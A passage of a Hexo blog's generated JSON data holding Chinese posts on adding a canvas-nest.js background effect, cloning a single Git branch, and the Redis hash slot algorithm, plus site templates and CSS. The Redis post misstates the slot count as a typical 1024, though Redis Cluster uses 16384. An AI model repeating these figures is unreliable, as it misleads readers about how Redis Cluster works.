class=\"code\"><pre><span class=\"line\">&lt;script color=<span class=\"string\">&quot;107,194,53&quot;</span> opacity=<span class=\"string\">&quot;1.0&quot;</span> zIndex=<span class=\"string\">&quot;-1&quot;</span> count=<span class=\"string\">&quot;99&quot;</span> src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>color设置的是线条的RGB值。</li>\n<li>opacity设置的是类似透明度的数值。</li>\n<li>count设置的是线条的数量。</li>\n</ul>\n<p>重新生成一下配置，就会出现效果了。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h3><p>静态的博客实在是太单调了，增加一点动态的效果吧。</p>\n<ol>\n<li>同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。</li>\n</ol>","more":"<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"comment\">#bodyEnd: source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#variable: source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>取消注释以后，创建这样的一个文件source&#x2F;_data&#x2F;footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。</li>\n</ol>\n<p>创建好之后，在文件插入以下代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script color=<span class=\"string\">&quot;107,194,53&quot;</span> opacity=<span class=\"string\">&quot;1.0&quot;</span> zIndex=<span class=\"string\">&quot;-1&quot;</span> count=<span class=\"string\">&quot;99&quot;</span> src=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>color设置的是线条的RGB值。</li>\n<li>opacity设置的是类似透明度的数值。</li>\n<li>count设置的是线条的数量。</li>\n</ul>\n<p>重新生成一下配置，就会出现效果了。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>"},{"title":"Git克隆指定的分支","date":"2023-08-06T13:23:09.000Z","_content":"\n### 问题描述\n\n在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？\n\n### 解决办法\n\n执行下面的命令\n\n```git\ngit clone --branch <branchname> <remote-repo-url>\n```\n\n<!-- more -->\n\n或者\n\n```git\ngit clone -b <branchname> <remote-repo-url>\n```\n\n这里 -b 只是 --branch 的别名。\n\n这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。\n\n这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：\n\n```bash\nknight@knight:~/nustarain$ git remote show origin \n* 远程 origin\n  获取地址：https://gitee.com/nustarain/nustarain.git\n  推送地址：https://gitee.com/nustarain/nustarain.git\n  HEAD 分支：main\n  远程分支：\n    hexo 已跟踪\n    main 已跟踪\n  为 'git pull' 配置的本地分支：\n    hexo 与远程 hexo 合并\n    main 与远程 main 合并\n  为 'git push' 配置的本地引用：\n    hexo 推送至 hexo (最新)\n    main 推送至 main (最新)\n```\n\n如果要单纯的只克隆一个分支，只需要加一个参数即可：\n\n```git\ngit clone --branch <branchname> --single-branch <remote-repo-url>\n```\n\n或者\n\n```git\ngit clone -b <branchname> --single-branch <remote-repo-url>\n```\n\n加上--single-branch就只会跟踪这个指定的分支了。","source":"_posts/GitSpecifyBranch.md","raw":"---\ntitle: Git克隆指定的分支\ndate: 2023-08-06 21:23:09\ncategories: 学习过程\ntags:\n  - Git\n---\n\n### 问题描述\n\n在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？\n\n### 解决办法\n\n执行下面的命令\n\n```git\ngit clone --branch <branchname> <remote-repo-url>\n```\n\n<!-- more -->\n\n或者\n\n```git\ngit clone -b <branchname> <remote-repo-url>\n```\n\n这里 -b 只是 --branch 的别名。\n\n这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。\n\n这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：\n\n```bash\nknight@knight:~/nustarain$ git remote show origin \n* 远程 origin\n  获取地址：https://gitee.com/nustarain/nustarain.git\n  推送地址：https://gitee.com/nustarain/nustarain.git\n  HEAD 分支：main\n  远程分支：\n    hexo 已跟踪\n    main 已跟踪\n  为 'git pull' 配置的本地分支：\n    hexo 与远程 hexo 合并\n    main 与远程 main 合并\n  为 'git push' 配置的本地引用：\n    hexo 推送至 hexo (最新)\n    main 推送至 main (最新)\n```\n\n如果要单纯的只克隆一个分支，只需要加一个参数即可：\n\n```git\ngit clone --branch <branchname> --single-branch <remote-repo-url>\n```\n\n或者\n\n```git\ngit clone -b <branchname> --single-branch <remote-repo-url>\n```\n\n加上--single-branch就只会跟踪这个指定的分支了。","slug":"GitSpecifyBranch","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e0002a7zj343gj28t1","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>执行下面的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --branch &lt;branchname&gt; &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone -b &lt;branchname&gt; &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这里 -b 只是 –branch 的别名。</p>\n<p>这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。</p>\n<p>这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/nustarain$ git remote show origin </span><br><span class=\"line\">* 远程 origin</span><br><span class=\"line\">  获取地址：https://gitee.com/nustarain/nustarain.git</span><br><span class=\"line\">  推送地址：https://gitee.com/nustarain/nustarain.git</span><br><span class=\"line\">  HEAD 分支：main</span><br><span class=\"line\">  远程分支：</span><br><span class=\"line\">    hexo 已跟踪</span><br><span class=\"line\">    main 已跟踪</span><br><span class=\"line\">  为 <span class=\"string\">&#x27;git pull&#x27;</span> 配置的本地分支：</span><br><span class=\"line\">    hexo 与远程 hexo 合并</span><br><span class=\"line\">    main 与远程 main 合并</span><br><span class=\"line\">  为 <span class=\"string\">&#x27;git push&#x27;</span> 配置的本地引用：</span><br><span class=\"line\">    hexo 推送至 hexo (最新)</span><br><span class=\"line\">    main 推送至 main (最新)</span><br></pre></td></tr></table></figure>\n\n<p>如果要单纯的只克隆一个分支，只需要加一个参数即可：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --branch &lt;branchname&gt; --single-branch &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone -b &lt;branchname&gt; --single-branch &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>加上–single-branch就只会跟踪这个指定的分支了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><p>执行下面的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --branch &lt;branchname&gt; &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>","more":"<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone -b &lt;branchname&gt; &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这里 -b 只是 –branch 的别名。</p>\n<p>这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。</p>\n<p>这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/nustarain$ git remote show origin </span><br><span class=\"line\">* 远程 origin</span><br><span class=\"line\">  获取地址：https://gitee.com/nustarain/nustarain.git</span><br><span class=\"line\">  推送地址：https://gitee.com/nustarain/nustarain.git</span><br><span class=\"line\">  HEAD 分支：main</span><br><span class=\"line\">  远程分支：</span><br><span class=\"line\">    hexo 已跟踪</span><br><span class=\"line\">    main 已跟踪</span><br><span class=\"line\">  为 <span class=\"string\">&#x27;git pull&#x27;</span> 配置的本地分支：</span><br><span class=\"line\">    hexo 与远程 hexo 合并</span><br><span class=\"line\">    main 与远程 main 合并</span><br><span class=\"line\">  为 <span class=\"string\">&#x27;git push&#x27;</span> 配置的本地引用：</span><br><span class=\"line\">    hexo 推送至 hexo (最新)</span><br><span class=\"line\">    main 推送至 main (最新)</span><br></pre></td></tr></table></figure>\n\n<p>如果要单纯的只克隆一个分支，只需要加一个参数即可：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --branch &lt;branchname&gt; --single-branch &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone -b &lt;branchname&gt; --single-branch &lt;remote-repo-url&gt;</span><br></pre></td></tr></table></figure>\n\n<p>加上–single-branch就只会跟踪这个指定的分支了。</p>"},{"title":"分布式存储之哈希槽算法","date":"2023-08-13T07:08:20.000Z","_content":"\n### 基本思想\n\n哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:\n\n1. 将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 \n\n2. 根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。\n\n<!-- more -->\n\n3. 将槽均匀分配给不同的节点。\n\n4. 节点只负责处理映射到自己槽位上的键值操作。\n\n例如,节点A负责0-511槽,节点B负责512-1023槽。\n\n对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。\n\n这种方式可将大量键值均匀地分布在不同节点上,实现扩展。\n\n增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。\n\n相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。\n\n### 缺点\n\n哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：\n\n1. 键空间分片粒度大\n\n哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。\n\n2. 热点键问题\n\n由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。\n\n3. 不均衡\n\n随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。\n\n4. 节点扩容缩容代价大\n\n扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。\n\n5. 只适合键值型数据库\n\n哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。\n\n总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。","source":"_posts/HasSlot.md","raw":"---\ntitle: 分布式存储之哈希槽算法\ndate: 2023-08-13 15:08:20\ncategories: 理论知识\ntags:\n  - Docker\n  - Redis\n---\n\n### 基本思想\n\n哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:\n\n1. 将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 \n\n2. 根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。\n\n<!-- more -->\n\n3. 将槽均匀分配给不同的节点。\n\n4. 节点只负责处理映射到自己槽位上的键值操作。\n\n例如,节点A负责0-511槽,节点B负责512-1023槽。\n\n对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。\n\n这种方式可将大量键值均匀地分布在不同节点上,实现扩展。\n\n增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。\n\n相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。\n\n### 缺点\n\n哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：\n\n1. 键空间分片粒度大\n\n哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。\n\n2. 热点键问题\n\n由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。\n\n3. 不均衡\n\n随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。\n\n4. 节点扩容缩容代价大\n\n扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。\n\n5. 只适合键值型数据库\n\n哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。\n\n总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。","slug":"HasSlot","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5e2002f7zj3244xh97m","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"基本思想\"><a href=\"#基本思想\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h3><p>哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:</p>\n<ol>\n<li><p>将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 </p>\n</li>\n<li><p>根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。</p>\n</li>\n</ol>\n<span id=\"more\"></span>\n\n<ol start=\"3\">\n<li><p>将槽均匀分配给不同的节点。</p>\n</li>\n<li><p>节点只负责处理映射到自己槽位上的键值操作。</p>\n</li>\n</ol>\n<p>例如,节点A负责0-511槽,节点B负责512-1023槽。</p>\n<p>对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。</p>\n<p>这种方式可将大量键值均匀地分布在不同节点上,实现扩展。</p>\n<p>增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。</p>\n<p>相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。</p>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><p>哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：</p>\n<ol>\n<li>键空间分片粒度大</li>\n</ol>\n<p>哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。</p>\n<ol start=\"2\">\n<li>热点键问题</li>\n</ol>\n<p>由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。</p>\n<ol start=\"3\">\n<li>不均衡</li>\n</ol>\n<p>随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。</p>\n<ol start=\"4\">\n<li>节点扩容缩容代价大</li>\n</ol>\n<p>扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。</p>\n<ol start=\"5\">\n<li>只适合键值型数据库</li>\n</ol>\n<p>哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。</p>\n<p>总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    